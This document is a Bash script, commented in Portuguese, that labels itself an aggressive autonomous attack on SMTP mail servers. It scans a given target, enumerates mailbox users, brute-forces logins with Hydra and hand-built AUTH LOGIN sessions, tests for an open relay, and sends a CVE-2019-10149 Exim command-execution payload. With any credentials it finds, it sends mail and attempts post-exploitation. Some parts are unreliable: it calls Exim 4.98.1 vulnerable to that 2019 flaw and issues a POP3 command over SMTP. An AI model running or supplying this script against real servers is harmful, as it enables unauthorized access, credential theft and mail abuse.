#!/bin/bash

################################################################################
# SCRIPT DE ATAQUE AUTÔNOMO - SMTP/Email (Portas 25, 26, 587, 465)
# Descrição: Ataque agressivo contra servidores SMTP
################################################################################

# Solicitar target e IP do usuário
if [ -z "$1" ] || [ -z "$2" ]; then
    echo "Uso: $0 <DOMINIO> <IP>"
    echo "Exemplo: $0 exemplo.com.br 192.168.1.100"
    exit 1
fi

TARGET="$1"
IP="$2"
PORTS=("25" "26" "587" "465")
LOG_DIR="./logs_smtp"
WORDLIST="/usr/share/wordlists/rockyou.txt"
RESULTS_FILE="$LOG_DIR/smtp_results.txt"

# Cores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${GREEN}[+] Iniciando ataque autônomo contra SMTP${NC}"
echo -e "${GREEN}[+] Target: $TARGET (Portas: ${PORTS[@]})${NC}"

mkdir -p $LOG_DIR

# Verificar e instalar ferramentas
check_and_install() {
    local tool=$1
    local install_cmd=$2
    
    if ! command -v $tool &> /dev/null; then
        echo -e "${YELLOW}[!] $tool não encontrado. Instalando...${NC}"
        eval $install_cmd
    fi
}

echo -e "${YELLOW}[*] Verificando ferramentas...${NC}"
check_and_install "nmap" "sudo apt-get update && sudo apt-get install -y nmap"
check_and_install "hydra" "sudo apt-get install -y hydra"
check_and_install "smtp-user-enum" "sudo apt-get install -y smtp-user-enum"
check_and_install "swaks" "sudo apt-get install -y swaks || (wget https://www.jetmore.org/john/code/swaks/files/swaks-20201014.0.tar.gz && tar -xzf swaks-20201014.0.tar.gz && sudo cp swaks-20201014.0/swaks /usr/local/bin/)"

# Criar wordlist básica
if [ ! -f "$WORDLIST" ]; then
    cat > /tmp/smtp_wordlist.txt << EOF
admin
root
administrator
password
123456
admin123
root123
EOF
    WORDLIST="/tmp/smtp_wordlist.txt"
fi

# Lista de usuários
USERS=("admin" "root" "administrator" "postmaster" "webmaster" "mail" "user" "test")

# FASE 1: RECONHECIMENTO
echo -e "${YELLOW}[*] FASE 1: Reconhecimento SMTP${NC}"
echo "=================================="

for PORT in "${PORTS[@]}"; do
    echo -e "${YELLOW}[*] Analisando porta $PORT...${NC}"
    
    # Banner grabbing
    echo -e "${YELLOW}[*] Banner grabbing...${NC}"
    timeout 5 bash -c "echo 'QUIT' | nc $IP $PORT" 2>&1 | tee $LOG_DIR/banner_$PORT.txt
    
    # Nmap SMTP scripts
    echo -e "${YELLOW}[*] Executando scripts Nmap...${NC}"
    nmap -p $PORT --script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 $IP > $LOG_DIR/nmap_smtp_$PORT.txt 2>&1
    cat $LOG_DIR/nmap_smtp_$PORT.txt
    
    # Verificar conectividade
    timeout 5 bash -c "echo > /dev/tcp/$IP/$PORT" 2>/dev/null
    if [ $? -ne 0 ]; then
        echo -e "${RED}[-] SMTP não está acessível na porta $PORT${NC}"
        continue
    fi
done

# FASE 2: ENUMERAÇÃO DE USUÁRIOS
echo -e "${YELLOW}[*] FASE 2: Enumeração de Usuários${NC}"
echo "=================================="

for PORT in "${PORTS[@]}"; do
    echo -e "${YELLOW}[*] Enumerando usuários na porta $PORT...${NC}"
    
    # smtp-user-enum
    if command -v smtp-user-enum &> /dev/null; then
        printf '%s\n' "${USERS[@]}" > /tmp/smtp_users.txt
        smtp-user-enum -M VRFY -U /tmp/smtp_users.txt -t $IP -p $PORT 2>&1 | tee $LOG_DIR/user_enum_$PORT.txt
        smtp-user-enum -M EXPN -U /tmp/smtp_users.txt -t $IP -p $PORT 2>&1 | tee -a $LOG_DIR/user_enum_$PORT.txt
        smtp-user-enum -M RCPT -U /tmp/smtp_users.txt -t $IP -p $PORT 2>&1 | tee -a $LOG_DIR/user_enum_$PORT.txt
    fi
    
    # Teste manual VRFY
    echo -e "${YELLOW}[*] Testando VRFY manualmente...${NC}"
    for user in "${USERS[@]}"; do
        (
            echo "VRFY $user"
            sleep 1
            echo "QUIT"
        ) | nc $IP $PORT 2>&1 | tee -a $LOG_DIR/vrfy_$PORT.txt
    done
    
    # Teste manual EXPN
    echo -e "${YELLOW}[*] Testando EXPN manualmente...${NC}"
    for user in "${USERS[@]}"; do
        (
            echo "EXPN $user"
            sleep 1
            echo "QUIT"
        ) | nc $IP $PORT 2>&1 | tee -a $LOG_DIR/expn_$PORT.txt
    done
done

# FASE 3: BRUTE FORCE
echo -e "${YELLOW}[*] FASE 3: Brute Force Agressivo${NC}"
echo "=================================="

for PORT in "${PORTS[@]}"; do
    echo -e "${YELLOW}[*] Atacando porta $PORT...${NC}"
    
    # Hydra
    echo -e "${YELLOW}[*] Executando Hydra...${NC}"
    hydra -L <(printf '%s\n' "${USERS[@]}") -P $WORDLIST -t 16 -W 1 -f -s $PORT smtp://$IP 2>&1 | tee $LOG_DIR/hydra_$PORT.txt
    
    # Testar senhas comuns
    COMMON_PASSWORDS=("admin" "root" "password" "123456" "admin123" "root123" "" "pass")
    
    for user in "${USERS[@]}"; do
        for pass in "${COMMON_PASSWORDS[@]}"; do
            echo -e "${YELLOW}[*] Testando $user:$pass na porta $PORT${NC}"
            
            # Usar swaks se disponível
            if command -v swaks &> /dev/null; then
                swaks --to $user@$TARGET --from test@test.com --server $IP --port $PORT --auth-user $user --auth-password "$pass" --quit-after AUTH 2>&1 | tee -a $LOG_DIR/swaks_$PORT.txt
            fi
            
            # Teste manual
            (
                echo "EHLO test.com"
                sleep 1
                echo "AUTH LOGIN"
                sleep 1
                echo -n "$user" | base64
                sleep 1
                echo -n "$pass" | base64
                sleep 1
                echo "QUIT"
            ) | nc $IP $PORT 2>&1 | tee -a $LOG_DIR/manual_auth_$PORT.txt
            
            if grep -q "235\|Authentication succeeded" $LOG_DIR/manual_auth_$PORT.txt; then
                echo -e "${GREEN}[+] SUCESSO! $user:$pass na porta $PORT${NC}" | tee -a $RESULTS_FILE
                echo "$user:$pass:$PORT" >> $LOG_DIR/credentials.txt
            fi
        done
    done
done

# FASE 4: TESTE DE RELAY SMTP
echo -e "${YELLOW}[*] FASE 4: Teste de Relay SMTP${NC}"
echo "=================================="

for PORT in "${PORTS[@]}"; do
    echo -e "${YELLOW}[*] Testando relay na porta $PORT...${NC}"
    
    # Tentar enviar email sem autenticação
    (
        echo "EHLO test.com"
        sleep 1
        echo "MAIL FROM: <test@$TARGET>"
        sleep 1
        echo "RCPT TO: <external@example.com>"
        sleep 1
        echo "DATA"
        sleep 1
        echo "Subject: Test"
        echo "Test message"
        echo "."
        sleep 1
        echo "QUIT"
    ) | nc $IP $PORT 2>&1 | tee $LOG_DIR/relay_test_$PORT.txt
    
    if grep -q "250\|OK" $LOG_DIR/relay_test_$PORT.txt && ! grep -q "550\|relay" $LOG_DIR/relay_test_$PORT.txt; then
        echo -e "${GREEN}[+] RELAY SMTP POSSÍVEL na porta $PORT!${NC}" | tee -a $RESULTS_FILE
    fi
done

# FASE 5: EXPLORAÇÃO DE VULNERABILIDADES
echo -e "${YELLOW}[*] FASE 5: Exploração de Vulnerabilidades${NC}"
echo "=================================="

# Exim 4.98.1 pode ter vulnerabilidades conhecidas
echo -e "${YELLOW}[*] Verificando vulnerabilidades do Exim 4.98.1...${NC}"

# CVE-2019-10149 - RCE
echo -e "${YELLOW}[*] Testando CVE-2019-10149 (RCE)...${NC}"
for PORT in "${PORTS[@]}"; do
    (
        echo "EHLO test.com"
        sleep 1
        echo "MAIL FROM: <>\${run{\${substr{0}{1}{\$spool_directory}}bin/bash${substr{10}{1}{\$tod_log}}${substr{0}{1}{\$spool_directory}}tmp${substr{0}{1}{\$spool_directory}}test.sh}}"
        sleep 1
        echo "QUIT"
    ) | nc $IP $PORT 2>&1 | tee $LOG_DIR/cve_2019_10149_$PORT.txt
done

# Se temos credenciais, tentar enviar emails maliciosos
if [ -f "$LOG_DIR/credentials.txt" ] && [ -s "$LOG_DIR/credentials.txt" ]; then
    echo -e "${GREEN}[+] Credenciais encontradas, tentando enviar emails...${NC}"
    
    while IFS=: read -r user pass port; do
        echo -e "${YELLOW}[*] Enviando email com $user:$pass na porta $port${NC}"
        
        if command -v swaks &> /dev/null; then
            swaks --to admin@$TARGET --from $user@$TARGET --server $IP --port $port --auth-user $user --auth-password "$pass" --header "Subject: Important" --body "Test" 2>&1 | tee $LOG_DIR/email_send_$user.txt
        fi
    done < $LOG_DIR/credentials.txt
fi

# FASE 6: PÓS-EXPLORAÇÃO
echo -e "${YELLOW}[*] FASE 6: Pós-Exploração${NC}"
echo "=================================="

if [ -f "$LOG_DIR/credentials.txt" ] && [ -s "$LOG_DIR/credentials.txt" ]; then
    echo -e "${GREEN}[+] Iniciando pós-exploração...${NC}"
    
    # Coletar informações via SMTP
    echo -e "${YELLOW}[*] Coletando informações...${NC}"
    
    while IFS=: read -r user pass port; do
        # Tentar obter lista de emails
        (
            echo "EHLO test.com"
            sleep 1
            echo "AUTH LOGIN"
            sleep 1
            echo -n "$user" | base64
            sleep 1
            echo -n "$pass" | base64
            sleep 1
            echo "LIST"
            sleep 1
            echo "QUIT"
        ) | nc $IP $port 2>&1 | tee $LOG_DIR/post_exploit_$user.txt
    done < $LOG_DIR/credentials.txt
fi

# RESUMO
echo ""
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}[+] ATAQUE SMTP CONCLUÍDO${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "${YELLOW}[*] Logs salvos em: $LOG_DIR${NC}"
echo -e "${YELLOW}[*] Resultados em: $RESULTS_FILE${NC}"
echo ""
ls -lah $LOG_DIR/

